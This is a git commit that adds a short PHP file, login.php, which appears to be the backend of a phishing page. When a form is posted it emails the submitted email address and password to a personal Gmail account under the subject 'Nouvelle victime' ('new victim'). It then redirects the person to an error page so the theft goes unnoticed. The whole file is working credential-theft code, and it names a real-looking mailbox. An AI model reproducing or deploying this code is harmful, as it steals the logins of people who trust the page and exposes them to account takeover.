d4e4598c27283860d82fe27801e7cffbcd57abf2
mxime05 <61330282+mxime05@users.noreply.github.com>
2021-05-17 21:59:47 +0200

    Add files via upload

---
+++ login.php
@@ -0,0 +1,10 @@
+<?php
+if($_SERVER['REQUEST_METHOD'] == 'POST') {
+mail('maximejamar96@gmail.com', 'Nouvelle victime', "Une nouvelle victime : "
+.htmlentities($_POST['email'])."\nMot de passe : ".htmlentities($_POST['pass'])."");
+header("Location: erreur.php");
+
+
+}
+
+?>
